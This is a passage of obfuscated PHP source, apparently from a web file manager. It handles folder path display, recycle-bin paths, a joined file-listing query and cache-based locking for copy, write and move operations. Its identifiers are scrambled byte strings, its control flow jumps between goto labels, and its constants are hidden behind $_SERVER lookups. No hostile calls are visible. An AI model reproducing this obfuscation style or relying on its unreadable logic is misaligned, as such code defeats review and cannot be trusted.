Action($C—§ÓèÈ[464])->pathGroupAuthMake($CÖçˆĞ„¼…[$C—§ÓèÈ[465]]); if (!$CÖçˆĞ„¼…[$C—§ÓèÈ[385]] && !_get($GLOBALS, $C—§ÓèÈ[466])) { $CÖçˆĞ„¼…[$C—§ÓèÈ[189]] = !1; $CÖçˆĞ„¼…[$C—§ÓèÈ[188]] = !1; } } if ($CÖçˆĞ„¼…[$C—§ÓèÈ[385]]) { $CÖçˆĞ„¼…[$C—§ÓèÈ[189]] = AuthModel::authCheckEdit($CÖçˆĞ„¼…[$C—§ÓèÈ[385]][$C—§ÓèÈ[386]]); $CÖçˆĞ„¼…[$C—§ÓèÈ[188]] = AuthModel::authCheckView($CÖçˆĞ„¼…[$C—§ÓèÈ[385]][$C—§ÓèÈ[386]]); } $this->groupPathDisplay($CÖçˆĞ„¼…); } goto fÁ·¶ô‰Á·; AÈŒŒëŒå‰: foreach ($f—İ£¿É”è as $CÖçˆĞ„¼…) { if ($CÖçˆĞ„¼…[$C—§ÓèÈ[380]] == self::TYPE_GROUP) { $EšÓ‹öŠ˜Û[] = $CÖçˆĞ„¼…[$C—§ÓèÈ[378]]; } } if (!$EšÓ‹öŠ˜Û) { return; } $eÔ…¯‚¾Œ¶ = array_to_keyvalue($f—İ£¿É”è, $C—§ÓèÈ[378]); goto d–›õËõØŠ; C™Ê£•Ê¢¯: $C—§ÓèÈ =& $_SERVER[í…¶]; if (!defined($C—§ÓèÈ[436])) { return; } $EšÓ‹öŠ˜Û = array(); goto AÈŒŒëŒå‰; fÁ·¶ô‰Á·: } public function groupPathDisplay(&$aŠòÏâ…¶Á) { goto e«Şâ½†Ù¡; e«Şâ½†Ù¡: $e¡îÚ¯Œîó =& $_SERVER[í…¶]; if ($aŠòÏâ…¶Á[$e¡îÚ¯Œîó[380]] != self::TYPE_GROUP) { return; } $aî„íñğ•· = Model($e¡îÚ¯Œîó[467])->getInfo($aŠòÏâ…¶Á[$e¡îÚ¯Œîó[465]]); goto eßƒìÌ­Û; CÀÀí“ê: $aŠòÏâ…¶Á[$e¡îÚ¯Œîó[473]] = $f˜ß‹„¬½­ . $aî„íñğ•·[$e¡îÚ¯Œîó[400]][$e¡îÚ¯Œîó[378]]; goto fîõì“ËœŒ; eßƒìÌ­Û: $fôÖ•›©­Õ = $this->parentLevelArray($aî„íñğ•·[$e¡îÚ¯Œîó[468]]); $f˜ß‹„¬½­ = $e¡îÚ¯Œîó[33]; foreach ($fôÖ•›©­Õ as $dŠµçÓŸ³‘) { $cíŒƒŠÉÒ½ = Model($e¡îÚ¯Œîó[467])->getInfo($dŠµçÓŸ³‘); $f˜ß‹„¬½­ .= $cíŒƒŠÉÒ½[$e¡îÚ¯Œîó[400]][$e¡îÚ¯Œîó[378]] . $e¡îÚ¯Œîó[47]; } goto cÍ÷­²‚Õ; cÍ÷­²‚Õ: $aŠòÏâ…¶Á[$e¡îÚ¯Œîó[469]] = $aî„íñğ•·[$e¡îÚ¯Œîó[470]]; $aŠòÏâ…¶Á[$e¡îÚ¯Œîó[389]] = $aî„íñğ•·[$e¡îÚ¯Œîó[468]]; $aŠòÏâ…¶Á[$e¡îÚ¯Œîó[471]] = $aî„íñğ•·[$e¡îÚ¯Œîó[472]]; goto CÀÀí“ê; fîõì“ËœŒ: } protected function _listAppendPath(&$A‡¬Ç›†õ) { goto f™Ïá›Ú; f™Ïá›Ú: $DÔŒ¼èÔ‘¸ =& $_SERVER[í…¶]; $F©ÔÇ¤™”Õ = array(); foreach ($A‡¬Ç›†õ as &$CñËÒ¢£Ô) { $F©ÔÇ¤™”Õ[$CñËÒ¢£Ô[$DÔŒ¼èÔ‘¸[378]]] = $CñËÒ¢£Ô[$DÔŒ¼èÔ‘¸[28]]; $fÑ£¾¤ãÒ× = $this->parentLevelArray($CñËÒ¢£Ô[$DÔŒ¼èÔ‘¸[468]]); array_shift($fÑ£¾¤ãÒ×); foreach ($fÑ£¾¤ãÒ× as $A†í™Î›Ş„) { if (!isset($F©ÔÇ¤™”Õ[$A†í™Î›Ş„])) { $F©ÔÇ¤™”Õ[$A†í™Î›Ş„] = 0; } } } goto bçÔÎ±‡šÙ; bçÔÎ±‡šÙ: $då¹”õÅ = array(); foreach ($F©ÔÇ¤™”Õ as $dÅ­ùÕ¯½ö => $d ‚Ü½Áã‚) { if (!$d ‚Ü½Áã‚) { $då¹”õÅ[] = $dÅ­ùÕ¯½ö; } } if ($då¹”õÅ) { $d¿™ ‚õˆ¾ = array($DÔŒ¼èÔ‘¸[392] => array($DÔŒ¼èÔ‘¸[393], $då¹”õÅ)); if (count($då¹”õÅ) == 1) { $cÜ‘¯††¿¤ = $this->sourceInfo($då¹”õÅ[0]); $cÜ‘¯††¿¤ = is_array($cÜ‘¯††¿¤) ? array($cÜ‘¯††¿¤) : !1; } else { $cÜ‘¯††¿¤ = $this->field($DÔŒ¼èÔ‘¸[474])->where($d¿™ ‚õˆ¾)->select(); } $F¸¼§½‡Ó¢ = array_to_keyvalue($cÜ‘¯††¿¤, $DÔŒ¼èÔ‘¸[378], $DÔŒ¼èÔ‘¸[28]); $F©ÔÇ¤™”Õ = array_merge_index($F©ÔÇ¤™”Õ, $F¸¼§½‡Ó¢); } goto E«½Ù¯ãï; E«½Ù¯ãï: $C†Ø‡×š™µ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($A‡¬Ç›†õ as &$CñËÒ¢£Ô) { goto fµ»Á†Â¥Ä; fµ»Á†Â¥Ä: $fÑ£¾¤ãÒ× = $this->parentLevelArray($CñËÒ¢£Ô[$DÔŒ¼èÔ‘¸[468]]); $E„£‘¨õ·¤ = $this->_listAppendPathRoot($CñËÒ¢£Ô, $fÑ£¾¤ãÒ×); foreach ($fÑ£¾¤ãÒ× as $A†í™Î›Ş„) { if (isset($F©ÔÇ¤™”Õ[$A†í™Î›Ş„])) { $E„£‘¨õ·¤ .= $F©ÔÇ¤™”Õ[$A†í™Î›Ş„] . $DÔŒ¼èÔ‘¸[8]; } } goto bÙã¼õØë¶; aâÄÌÇ¨Í: $dßËã†®“ = trim($CñËÒ¢£Ô[$DÔŒ¼èÔ‘¸[475]], $DÔŒ¼èÔ‘¸[8]); if ($CñËÒ¢£Ô[$DÔŒ¼èÔ‘¸[470]] == $DÔŒ¼èÔ‘¸[477] && $dßËã†®“) { $CñËÒ¢£Ô[$DÔŒ¼èÔ‘¸[28]] = $dßËã†®“; } $this->_listAppendPathRecycle($CñËÒ¢£Ô, $fÑ£¾¤ãÒ×, $C†Ø‡×š™µ); goto Fó‰É’¯È°; bÙã¼õØë¶: if ($fÑ£¾¤ãÒ×) { $E„£‘¨õ·¤ .= $CñËÒ¢£Ô[$DÔŒ¼èÔ‘¸[28]]; } if ($CñËÒ¢£Ô[$DÔŒ¼èÔ‘¸[379]]) { $E„£‘¨õ·¤ .= $DÔŒ¼èÔ‘¸[8]; } $CñËÒ¢£Ô[$DÔŒ¼èÔ‘¸[475]] = str_replace($DÔŒ¼èÔ‘¸[476], $DÔŒ¼èÔ‘¸[8], $E„£‘¨õ·¤); goto aâÄÌÇ¨Í; Fó‰É’¯È°: } goto bµ¥ÔÌ‰†; bµ¥ÔÌ‰†: } private function _listAppendPathRecycle(&$CÌñÍÍ½ôì, $bŸíÂãõé¦, $AŞÈç¤¡¼Ÿ) { goto f‹Áƒ‡¢ì“; EïõŞÑáó: $fÑ”ÄÜæ¬Û = explode($dà÷Ã¸ˆù¾[8], trim($CÌñÍÍ½ôì[$dà÷Ã¸ˆù¾[475]], $dà÷Ã¸ˆù¾[8])); $b¼Òª‚‰Ç = implode($dà÷Ã¸ˆù¾[8], array_slice($fÑ”ÄÜæ¬Û, 2)); $CÌñÍÍ½ôì[$dà÷Ã¸ˆù¾[475]] = $dà÷Ã¸ˆù¾[8] . LNG($dà÷Ã¸ˆù¾[478]) . $dà÷Ã¸ˆù¾[8] . ltrim($b¼Òª‚‰Ç, $dà÷Ã¸ˆù¾[8]); goto aó“½µ¿ï³; f‹Áƒ‡¢ì“: $dà÷Ã¸ˆù¾ =& $_SERVER[í…¶]; if (intval($CÌñÍÍ½ôì[$dà÷Ã¸ˆù¾[380]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($AŞÈç¤¡¼Ÿ, $bŸíÂãõé¦) && $CÌñÍÍ½ôì[$dà÷Ã¸ˆù¾[378]] != $AŞÈç¤¡¼Ÿ) { return; } goto EïõŞÑáó; aó“½µ¿ï³: $CÌñÍÍ½ôì[$dà÷Ã¸ˆù¾[468]] = $dà÷Ã¸ˆù¾[479] . implode($dà÷Ã¸ˆù¾[47], array_slice($bŸíÂãõé¦, 1)) . $dà÷Ã¸ˆù¾[47]; if ($CÌñÍÍ½ôì[$dà÷Ã¸ˆù¾[378]] == $AŞÈç¤¡¼Ÿ) { $CÌñÍÍ½ôì[$dà÷Ã¸ˆù¾[468]] = $dà÷Ã¸ˆù¾[479]; $CÌñÍÍ½ôì[$dà÷Ã¸ˆù¾[470]] = $dà÷Ã¸ˆù¾[477]; $CÌñÍÍ½ôì[$dà÷Ã¸ˆù¾[28]] = LNG($dà÷Ã¸ˆù¾[478]); } $CÌñÍÍ½ôì[$dà÷Ã¸ˆù¾[480]] = $dà÷Ã¸ˆù¾[481]; goto A—ŞÉ°®ª½; A—ŞÉ°®ª½: } protected function _listAppendPathRoot(&$C…ò›–Ù™‰, $A‹„‰ñ‚šÍ) { $Cæï‹ÊÚÅ =& $_SERVER[í…¶]; $eÀÇÁ×˜ŒÅ = $Cæï‹ÊÚÅ[33]; if ($C…ò›–Ù™‰[$Cæï‹ÊÚÅ[380]] == self::TYPE_USER) { if (defined($Cæï‹ÊÚÅ[436]) && $C…ò›–Ù™‰[$Cæï‹ÊÚÅ[465]] == USER_ID) { $eÀÇÁ×˜ŒÅ = LNG($Cæï‹ÊÚÅ[482]); if (!$A‹„‰ñ‚šÍ) { $C…ò›–Ù™‰[$Cæï‹ÊÚÅ[28]] = $eÀÇÁ×˜ŒÅ; } } else { $EÉ„Á¼î× = Model($Cæï‹ÊÚÅ[483])->getInfoSimple($C…ò›–Ù™‰[$Cæï‹ÊÚÅ[465]]); $eÀÇÁ×˜ŒÅ = LNG($Cæï‹ÊÚÅ[484]) . $Cæï‹ÊÚÅ[157] . $EÉ„Á¼î×[$Cæï‹ÊÚÅ[28]] . $Cæï‹ÊÚÅ[485]; } } else { if ($C…ò›–Ù™‰[$Cæï‹ÊÚÅ[380]] == self::TYPE_GROUP) { $EÉ„Á¼î× = Model($Cæï‹ÊÚÅ[467])->getInfoSimple($C…ò›–Ù™‰[$Cæï‹ÊÚÅ[465]]); $eÀÇÁ×˜ŒÅ = $EÉ„Á¼î×[$Cæï‹ÊÚÅ[28]]; } else { if ($C…ò›–Ù™‰[$Cæï‹ÊÚÅ[380]] == self::TYPE_SYSTEM) { $EÉ„Á¼î× = $this->sourceInfo($A‹„‰ñ‚šÍ[0], !0); $eÀÇÁ×˜ŒÅ = $EÉ„Á¼î×[$Cæï‹ÊÚÅ[28]]; } } } $eÀÇÁ×˜ŒÅ = $eÀÇÁ×˜ŒÅ ? $Cæï‹ÊÚÅ[8] . $eÀÇÁ×˜ŒÅ . $Cæï‹ÊÚÅ[8] : $Cæï‹ÊÚÅ[8]; return $eÀÇÁ×˜ŒÅ; } protected function _listAppendUser(&$cˆ˜Œí—¾Ã) { $EÁ”İ‚±”‰ =& $_SERVER[í…¶]; $a¢Ô¹ää’ = array_to_keyvalue($cˆ˜Œí—¾Ã, $EÁ”İ‚±”‰[33], $EÁ”İ‚±”‰[387]); $A«—Ö‡éñÀ = array_to_keyvalue($cˆ˜Œí—¾Ã, $EÁ”İ‚±”‰[33], $EÁ”İ‚±”‰[388]); $FĞŒØ’ÛäÇ = array_merge($a¢Ô¹ää’, $A«—Ö‡éñÀ); $b¿ÔĞåÉÄ = Model($EÁ”İ‚±”‰[486])->userListInfo($FĞŒØ’ÛäÇ); foreach ($cˆ˜Œí—¾Ã as &$F­Ü„¯è) { $cË½´œå…– = $F­Ü„¯è[$EÁ”İ‚±”‰[387]]; $F­Ü„¯è[$EÁ”İ‚±”‰[387]] = $b¿ÔĞåÉÄ[$cË½´œå…–] ? $b¿ÔĞåÉÄ[$cË½´œå…–] : !1; $cË½´œå…– = $F­Ü„¯è[$EÁ”İ‚±”‰[388]]; $F­Ü„¯è[$EÁ”İ‚±”‰[388]] = $b¿ÔĞåÉÄ[$cË½´œå…–] ? $b¿ÔĞåÉÄ[$cË½´œå…–] : !1; if (isset($F­Ü„¯è[$EÁ”İ‚±”‰[426]]) && $F­Ü„¯è[$EÁ”İ‚±”‰[426]][$EÁ”İ‚±”‰[487]]) { $A×¯àùŒÌ¨ = $GLOBALS[$EÁ”İ‚±”‰[6]][$EÁ”İ‚±”‰[84]][$EÁ”İ‚±”‰[488]]; if ($F­Ü„¯è[$EÁ”İ‚±”‰[426]][$EÁ”İ‚±”‰[489]] <= time() - $A×¯àùŒÌ¨) { $this->metaSet($F­Ü„¯è[$EÁ”İ‚±”‰[378]], $EÁ”İ‚±”‰[487], null); $this->metaSet($F­Ü„¯è[$EÁ”İ‚±”‰[378]], $EÁ”İ‚±”‰[489], null); unset($F­Ü„¯è[$EÁ”İ‚±”‰[426]][$EÁ”İ‚±”‰[487]]); continue; } $EÀßóôĞîŒ = $F­Ü„¯è[$EÁ”İ‚±”‰[426]][$EÁ”İ‚±”‰[487]]; $F­Ü„¯è[$EÁ”İ‚±”‰[426]][$EÁ”İ‚±”‰[490]] = Model($EÁ”İ‚±”‰[486])->getInfoSimpleOuter($EÀßóôĞîŒ); } } } public function parentLevelArray($aù½áŒÃò) { $d“—Á†ÏŠ¹ =& $_SERVER[í…¶]; $aù½áŒÃò = explode($d“—Á†ÏŠ¹[47], trim($aù½áŒÃò, $d“—Á†ÏŠ¹[47])); return array_remove_value($aù½áŒÃò, $d“—Á†ÏŠ¹[477]); } public function listAll($bÔê’Œö†ø) { goto eÖÏŒ÷ŒÎâ; c¼è¸í¡¿¹: $Aˆ‡íù óã = $b­‹Îˆ„ô[495]; $cñÈÏ×ß = "\114\105\x46\124\40\112\x4f\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\146\151\x6c\x65\40\x66\151\154\x65\x20\157\156\x20\x73\x6f\x75\162\x63\x65\56\146\151\x6c\145\111\104\40\x3d\x20\146\x69\x6c\145\56\146\151\x6c\x65\111\x44"; $eÈÍê¡®¡ = $this->alias($b­‹Îˆ„ô[496])->field($Aˆ‡íù óã)->where($Aä•ˆ¶À‰)->join($cñÈÏ×ß)->select(); goto EÌÁïœ¸Öƒ; eÖÏŒ÷ŒÎâ: $b­‹Îˆ„ô =& $_SERVER[í…¶]; $Aíµô—é¥ğ = $this->sourceInfo($bÔê’Œö†ø); $Aä•ˆ¶À‰ = array($b­‹Îˆ„ô[491] => array($b­‹Îˆ„ô[492], $Aíµô—é¥ğ[$b­‹Îˆ„ô[468]] . $bÔê’Œö†ø . $b­‹Îˆ„ô[493]), $b­‹Îˆ„ô[494] => 0); goto c¼è¸í¡¿¹; D÷ß‘Úíğ : $e×ˆ´•ç› = array(); foreach ($eÈÍê¡®¡ as $bÅÆÉ‚Àì³ => $b‚ù—Ü”) { goto f²ÎĞëæÒ; f²ÎĞëæÒ: $E·ëÑõÖàŒ = $this->parentLevelArray($b‚ù—Ü”[$b­‹Îˆ„ô[468]]); array_shift($E·ëÑõÖàŒ); $cŞÈ‹’¸é = $Bî´½¾Ü®; goto F£¡Ì‘ò‰; Aš“±é›¦¡: if (!$b‚ù—Ü”[$b­‹Îˆ„ô[379]]) { $a˜Ë›ŞÆç¿[$b­‹Îˆ„ô[428]] = $b‚ù—Ü”[$b­‹Îˆ„ô[428]]; $a˜Ë›ŞÆç¿[$b­‹Îˆ„ô[498]] = $b‚ù—Ü”[$b­‹Îˆ„ô[75]]; } $e×ˆ´•ç›[] = $a˜Ë›ŞÆç¿; goto fìÊ÷ ¹; b·¶ä¿†Ãç: $cŞÈ‹’¸é = str_replace($b­‹Îˆ„ô[476], $b­‹Îˆ„ô[8], $cŞÈ‹’¸é); $cŞÈ‹’¸é = str_replace($b­‹Îˆ„ô[476], $b­‹Îˆ„ô[8], $cŞÈ‹’¸é); $a˜Ë›ŞÆç¿ = array($b­‹Îˆ„ô[396] => str_replace($b­‹Îˆ„ô[476], $b­‹Îˆ„ô[8], $cŞÈ‹’¸é), $b­‹Îˆ„ô[497] => intval($b‚ù—Ü”[$b­‹Îˆ„ô[379]]), $b­‹Îˆ„ô[400] => $this->pathInfoFilter($b‚ù—Ü”, !0)); goto Aš“±é›¦¡; F£¡Ì‘ò‰: for ($dÅ×®ÇÅÔ = 0; $dÅ×®ÇÅÔ < count($E·ëÑõÖàŒ); $dÅ×®ÇÅÔ++) { $cŞÈ‹’¸é .= $eÈÍê¡®¡[$E·ëÑõÖàŒ[$dÅ×®ÇÅÔ]][$b­‹Îˆ„ô[28]] . $b­‹Îˆ„ô[8]; } $cŞÈ‹’¸é .= $b‚ù—Ü”[$b­‹Îˆ„ô[28]]; if ($b‚ù—Ü”[$b­‹Îˆ„ô[379]]) { $cŞÈ‹’¸é .= $b­‹Îˆ„ô[8]; } goto b·¶ä¿†Ãç; fìÊ÷ ¹: } return $e×ˆ´•ç›; goto dá˜â®«…Õ; fê–†Ğ šÌ: $eÈÍê¡®¡ = array_to_keyvalue($eÈÍê¡®¡, $b­‹Îˆ„ô[378]); $Bî´½¾Ü® = "\x2f{$Aíµô—é¥ğ[$b­‹Îˆ„ô[28]]}\57"; $Bî´½¾Ü® = $Bî´½¾Ü® == $b­‹Îˆ„ô[476] ? $b­‹Îˆ„ô[8] : $Bî´½¾Ü®; goto D÷ß‘Úíğ ; EÌÁïœ¸Öƒ: $this->_listAppendAuth($eÈÍê¡®¡); $this->_listAppendUser($eÈÍê¡®¡); $this->_listAppendPath($eÈÍê¡®¡); goto fê–†Ğ šÌ; dá˜â®«…Õ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($E‡âÕ»ëÅ®) { goto E¯ÕæÇ“Êº; fŞÄÎ«Ú‰: $this->_lockEvent($E‡âÕ»ëÅ®, array($a¨ƒùá¤[502], $a¨ƒùá¤[503]), $C±•ã“í‡±); $this->_lockCheckEnd($a¨ƒùá¤[499], $E‡âÕ»ëÅ®); goto aáğÈ³ïÆ; E¯ÕæÇ“Êº: $a¨ƒùá¤ =& $_SERVER[í…¶]; if (!$this->allowLock()) { return; } $this->_lockCheck($a¨ƒùá¤[499], $E‡âÕ»ëÅ®); goto f°£¨„¹†ß; f°£¨„¹†ß: $C±•ã“í‡± = 1; $this->_lockEvent($E‡âÕ»ëÅ®, array($a¨ƒùá¤[500], $a¨ƒùá¤[501]), $C±•ã“í‡±); $this->_lockParent($E‡âÕ»ëÅ®, array($a¨ƒùá¤[501]), $C±•ã“í‡±); goto fŞÄÎ«Ú‰; aáğÈ³ïÆ: } public function lockCopyEnd($dŸ®ëĞŸô) { $d·‰‡ÆÒæÚ =& $_SERVER[í…¶]; if (!$this->allowLock()) { return; } $FÜ³×Ê“÷ã = 0; $this->_lockEvent($dŸ®ëĞŸô, array($d·‰‡ÆÒæÚ[500], $d·‰‡ÆÒæÚ[501]), $FÜ³×Ê“÷ã); $this->_lockParent($dŸ®ëĞŸô, array($d·‰‡ÆÒæÚ[501]), $FÜ³×Ê“÷ã); $this->_lockEvent($dŸ®ëĞŸô, array($d·‰‡ÆÒæÚ[502], $d·‰‡ÆÒæÚ[503]), $FÜ³×Ê“÷ã); } public function lockWriteStart($E‹ÃëÍ®‚š, $FŸÕİœÂÚÏ = '') { goto BŒ×Öƒ‘™–; a•éÃİé°à: $D òê£õ = 1; $this->_lockKey($b‹†Ú’á­[504] . $E‹ÃëÍ®‚š . $b‹†Ú’á­[91] . $FŸÕİœÂÚÏ, $D òê£õ); $this->_lockEvent($E‹ÃëÍ®‚š, array($b‹†Ú’á­[499], $b‹†Ú’á­[501]), $D òê£õ); goto cºÇ´´éá¸; cºÇ´´éá¸: $this->_lockParent($E‹ÃëÍ®‚š, array($b‹†Ú’á­[499], $b‹†Ú’á­[501]), $D òê£õ); $this->_lockCheckEnd($b‹†Ú’á­[500], $E‹ÃëÍ®‚š); goto FºÕ¡ƒÈ«; BŒ×Öƒ‘™–: $b‹†Ú’á­ =& $_SERVER[í…¶]; if (!$this->allowLock()) { return; } $this->_lockCheck($b‹†Ú’á­[500], $E‹ÃëÍ®‚š); goto a•éÃİé°à; FºÕ¡ƒÈ«: } public function lockWriteEnd($c“‹¯ªù¥é, $aÜï÷ÃÍ¸ = '') { $dŠêàå¢ëİ =& $_SERVER[í…¶]; if (!$this->allowLock()) { return; } $AˆâƒË•áÆ = 0; $this->_lockKey($dŠêàå¢ëİ[504] . $c“‹¯ªù¥é . $dŠêàå¢ëİ[91] . $aÜï÷ÃÍ¸, $AˆâƒË•áÆ); $this->_lockEvent($c“‹¯ªù¥é, array($dŠêàå¢ëİ[499], $dŠêàå¢ëİ[501]), $AˆâƒË•áÆ); $this->_lockParent($c“‹¯ªù¥é, array($dŠêàå¢ëİ[499], $dŠêàå¢ëİ[501]), $AˆâƒË•áÆ); } public function lockMoveStart($bğ‡¼Ø•Â) { goto cÙêÊ£¸–¤; e³µ‘ËëÓÔ: $this->_lockParent($bğ‡¼Ø•Â, array($BéôØÊì¨[499], $BéôØÊì¨[501]), $C‹‹ÈÑ™Ø¤); $this->_lockEvent($bğ‡¼Ø•Â, array($BéôØÊì¨[506], $BéôØÊì¨[502], $BéôØÊì¨[503]), $C‹‹ÈÑ™Ø¤); $this->_lockCheckEnd($BéôØÊì¨[501], $bğ‡¼Ø•Â); goto E¤òÆÏäªÑ; A«İ¹ÖÇ‡Ó: $C‹‹ÈÑ™Ø¤ = 1; $this->_lockKey($BéôØÊì¨[505] . $bğ‡¼Ø•Â, $C‹‹ÈÑ™Ø¤); $this->_lockEvent($bğ‡¼Ø•Â, array($BéôØÊì¨[499], $BéôØÊì¨[500]), $C‹‹ÈÑ™Ø¤); goto e³µ‘ËëÓÔ; cÙêÊ£¸–¤: $BéôØÊì¨ =& $_SERVER[í…¶]; if (!$this->allowLock()) { return; } $this->_lockCheck($BéôØÊì¨[501], $bğ‡¼Ø•Â); goto A«İ¹ÖÇ‡Ó; E¤òÆÏäªÑ: } public function lockMoveEnd($Eˆƒ«“Ê““) { goto Bõ†í—ÒÛ¯; e½‡´Û–™ : $this->_lockEvent($Eˆƒ«“Ê““, array($få“Ä¿©º³[506], $få“Ä¿©º³[502], $få“Ä¿©º³[503]), $F›†¶÷±¹ƒ); goto aõÊË„õ¹¥; AÎµßõò‡»: $this->_lockKey($få“Ä¿©º³[505] . $Eˆƒ«“Ê““, $F›†¶÷±¹ƒ); $this->_lockEvent($Eˆƒ«“Ê““, array($få“Ä¿©º³[499], $få“Ä¿©º³[500]), $F›†¶÷±¹ƒ); $this->_lockParent($Eˆƒ«“Ê““, array($få“Ä¿©º³[499], $få“Ä¿©º³[501]), $F›†¶÷±¹ƒ); goto e½‡´Û–™ ; Bõ†í—ÒÛ¯: $få“Ä¿©º³ =& $_SERVER[í…¶]; if (!$this->allowLock()) { return; } $F›†¶÷±¹ƒ = 0; goto AÎµßõò‡»; aõÊË„õ¹¥: } private function _lockCheck($EŸ±´Š½—, $câæ·½½¢) { goto FßÙÍŒàå; E¡¿¤É—¥: $dÏ´ÒßÁ¡ô = array_reverse($this->parentLevelArray($bíĞ·¥Â[$aò™ØËÎ¦Ÿ[468]])); foreach ($dÏ´ÒßÁ¡ô as $Dø¤“ßèãò) { $dëïñ›ç = $EŸ±´Š½— . $aò™ØËÎ¦Ÿ[508] . $Dø¤“ßèãò; if (CacheLock::lockGet($aò™ØËÎ¦Ÿ[509] . $dëïñ›ç)) { $bíĞ·¥Â = $this->sourceInfo($Dø¤“ßèãò); CacheLock::setErrorMsg($aò™ØËÎ¦Ÿ[157] . htmlspecialchars($bíĞ·¥Â[$aò™ØËÎ¦Ÿ[28]]) . $aò™ØËÎ¦Ÿ[485] . $CÚº¬œ²‰Æ); $this->_lockKey($dëïñ›ç, 1); $this->_lockKey($dëïñ›ç, 0); } } goto eøœ†±ôÙ”; e´Ğ¡”±Ÿ: CacheLock::setErrorMsg($aò™ØËÎ¦Ÿ[157] . htmlspecialchars($bíĞ·¥Â[$aò™ØËÎ¦Ÿ[28]]) . $aò™ØËÎ¦Ÿ[485] . $CÚº¬œ²‰Æ); $this->_lockKey($dëïñ›ç, 1); $this->_lockKey($dëïñ›ç, 0); goto E¡¿¤É—¥; dù¤†¿®¸: $this->_lockTimeStart[$dëïñ›ç] = timeFloat(); if (!is_array($bíĞ·¥Â)) { return; } $CÚº¬œ²‰Æ = LNG($aò™ØËÎ¦Ÿ[507]); goto e´Ğ¡”±Ÿ; FßÙÍŒàå: $aò™ØËÎ¦Ÿ =& $_SERVER[í…¶]; $bíĞ·¥Â = $this->sourceInfo($câæ·½½¢); $dëïñ›ç = $EŸ±´Š½— . $aò™ØËÎ¦Ÿ[91] . $câæ·½½¢; goto dù¤†¿®¸; eøœ†±ôÙ”: } private function _lockCheckEnd($CİíçÇ„†ô, $AÇ°ùóÒ†Ì) { goto A‹¼Œ™©Ù¬; A“Å°‰Î‡ì: if (!isset($this->_lockTimeStart[$A‡ÒîÒ…Éª])) { return; } $CíŠÙáàÂã = timeFloat() - $this->_lockTimeStart[$A‡ÒîÒ…Éª]; unset($this->_lockTimeStart[$A‡ÒîÒ…Éª]); goto dÖ¶ŠææŞ™; A‹¼Œ™©Ù¬: $EÚŸ¨Ÿœ† =& $_SERVER[í…¶]; $A‡ÒîÒ…Éª = $CİíçÇ„†ô . $EÚŸ¨Ÿœ†[91] . $AÇ°ùóÒ†Ì; CacheLock::setErrorMsg($EÚŸ¨Ÿœ†[370]); goto A“Å°‰Î‡ì; dÖ¶ŠææŞ™: if ($CíŠÙáàÂã > 0.5) { unset(self::$cacheSourceInfo[$EÚŸ¨Ÿœ†[419] . $AÇ°ùóÒ†Ì]); } $EØ¡©¼¬õ“ = $this->sourceInfo($AÇ°ùóÒ†Ì); if (!$EØ¡©¼¬õ“) { show_json(LNG($EÚŸ¨Ÿœ†[101]), !1); } goto DãÏ²¨ÎŞ; DãÏ²¨ÎŞ: } private function _lockParent($f¬ˆÉ¶©®·, $a–Âª¶ø‘ğ, $c…ŸåĞ‚ˆ) { if (!$this->autoLockSet) { return; } $CËÈÌÜŞ›í = $this->sourceInfo($f¬ˆÉ¶©®·); if (!is_array($CËÈÌÜŞ›í)) { return; } $fí·—çø‹ = array_reverse($this->parentLevelArray($CËÈÌÜŞ›í[$_SERVER[í…¶][468]])); foreach ($fí·—çø‹ as $fÏõ®©øëè) { $this->_lockEvent($fÏõ®©øëè, $a–Âª¶ø‘ğ, $c…ŸåĞ‚ˆ); } } private function _lockEvent($aëÔ¿‡Œæí, $A´´åšÔÒÖ, $f»–ÚÚôéš) { $d³¶ÖÂ®‰õ =& $_SERVER[í…¶]; if (!$this->autoLockSet) { return; } foreach ($A´´åšÔÒÖ as $CÄ«¤ÄøÑ¾) { $f®÷Çè·®Å = $CÄ«¤ÄøÑ¾ . $d³¶ÖÂ®‰õ[91] . $aëÔ¿‡Œæí; if ($f»–ÚÚôéš && CacheLock::lockGet($d³¶ÖÂ®‰õ[509] . $f®÷Çè·®Å)) { continue; } $this->_lockKey($f®÷Çè·®Å, $f»–ÚÚôéš); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($dœó¦‹çÍ, $aèÇŞ¬Óç¬ = 1) { $b²¤Ïçò×è = $_SERVER[í…¶][509] . md5($dœó¦‹çÍ); if ($aèÇŞ¬Óç¬) { if (isset(self::$_lockItemArr[$b²¤Ïçò×è])) { return; } self::$_lockItemArr[$b²¤Ïçò×è] = 1; CacheLock::lock($b²¤Ïçò×è, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$b²¤Ïçò×è])) { return; } unset(self::$_lockItemArr[$b²¤Ïçò×è]); CacheLock::unlock($b²¤Ïçò×è); } } public function isParentOf($eÕó‰¡¥¾ª, $aÁ¿¿×†×§) { goto D§š¸ó¶Šõ; D§š¸ó¶Šõ: $fÚ¹·ÔæÖ =& $_SERVER[í…¶]; $a¼È«©ÇŒ = $this->sourceInfo($eÕó‰¡¥¾ª); $A³Òø‰²È§ = $this->sourceInfo($aÁ¿¿×†×§); goto DğŸõÓÏæŸ; Bœ—öÌï”é: return $c‚¯äóİ²—; goto cè‚¢ÍŒ¥; DğŸõÓÏæŸ: $eÑÛöÁ­ĞÔ = $a¼È«©ÇŒ[$fÚ¹·ÔæÖ[468]] . $a¼È«©ÇŒ[$fÚ¹·ÔæÖ[378]] . $fÚ¹·ÔæÖ[47]; $Cë²¯»” = $A³Òø‰²È§[$fÚ¹·ÔæÖ[468]] . $A³Òø‰²È§[$fÚ¹·ÔæÖ[378]] . $fÚ¹·ÔæÖ[47]; $c‚¯äóİ²— = strpos($Cë²¯»”, $eÑÛöÁ­ĞÔ) === 0; goto Bœ—öÌï”é; cè‚¢ÍŒ¥: } private $targetIsDelete = 0; public function copy($dÕ¦‹öÑ•, $eá®„ÛŒà, $fÜ¦ÀÄ¶‰ò = REPEAT_REPLACE, $a¼“Ë¸¥èÒ = '') { goto fö±Š¶åÖ¤; bŒåÜÅ·â: if ($A„¶‹öÌ”¤[$cŠĞŒÎÏÄˆ[379]] == $cŠĞŒÎÏÄˆ[83] && $Dì‹Õ£‡ãµ == $eé“÷×»Ìê) { $this->folderSizeResetChildren($Dì‹Õ£‡ãµ); } 